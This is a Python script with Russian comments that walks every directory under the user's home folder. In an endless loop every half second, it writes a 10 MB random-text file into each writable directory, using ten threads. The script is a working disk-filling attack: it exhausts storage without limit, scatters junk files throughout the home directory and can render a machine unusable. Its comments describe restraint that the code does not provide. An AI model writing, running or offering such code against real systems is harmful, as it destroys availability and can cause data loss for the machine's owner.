import os
import random
import string
import traceback
import concurrent.futures
import time

def generate_random_data(size):
    """Генерирует случайные данные для файла более эффективно"""
    try:
        # Генерируем строку разного размера с большим количеством данных для записи
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    except Exception as e:
        print(f"Ошибка при генерации данных: {e}")
        traceback.print_exc()
        return ""

def create_large_file(file_path, file_size):
    """Создает файл заданного размера с рандомными данными и выводит путь к файлу"""
    try:
        # Используем блоки данных для записи
        data = generate_random_data(file_size)
        
        # Открываем файл и записываем данные за один раз
        with open(file_path, 'w') as f:
            f.write(data)
        print(f"Файл создан: {file_path}")
    except Exception as e:
        print(f"Не удалось создать файл в {file_path}: {e}")
        traceback.print_exc()

def is_writable(directory):
    """Проверяет, доступна ли директория для записи"""
    try:
        return os.access(directory, os.W_OK)
    except Exception as e:
        print(f"Ошибка при проверке доступа к {directory}: {e}")
        traceback.print_exc()
        return False

def create_files_in_directory(dirpath, file_size):
    """Создает файлы в данной директории"""
    try:
        # Генерируем случайное имя файла
        random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.txt'
        file_path = os.path.join(dirpath, random_file_name)
        
        # Проверяем, есть ли права на запись в директорию
        if not is_writable(dirpath):
            print(f"Нет прав на запись в {dirpath}")
            return

        # Создаем файл в доступной директории
        create_large_file(file_path, file_size)
    except Exception as e:
        print(f"Ошибка при создании файла в директории {dirpath}: {e}")
        traceback.print_exc()

def traverse_and_create_files(root_dir, file_size):
    """Обходит все директории в домашней директории и создает файлы размером file_size, используя многозадачность"""
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Уменьшаем количество параллельных потоков
            # Получаем список всех поддиректорий в корневой директории
            for dirpath, dirnames, filenames in os.walk(root_dir):
                # Пропускаем системные директории или защищенные
                if '/sys/' in dirpath or '/proc/' in dirpath:
                    continue
                
                # Отправляем задачу на создание файлов в директорию
                executor.submit(create_files_in_directory, dirpath, file_size)
    except Exception as e:
        print(f"Ошибка в traverse_and_create_files: {e}")
        traceback.print_exc()

def main():
    try:
        file_size = 10 * 1024 * 1024  # 10 MB
        root_dir = os.path.expanduser("~")  # Начальная директория для обхода — домашняя директория
        print(f"Начинаем создание файлов в директории: {root_dir}")
        
        # Запускаем бесконечный цикл для непрерывного создания файлов
        while True:
            traverse_and_create_files(root_dir, file_size)
            time.sleep(0.5)  # Уменьшаем задержку между циклами, чтобы избежать перегрузки

    except Exception as e:
        print(f"Ошибка в main: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
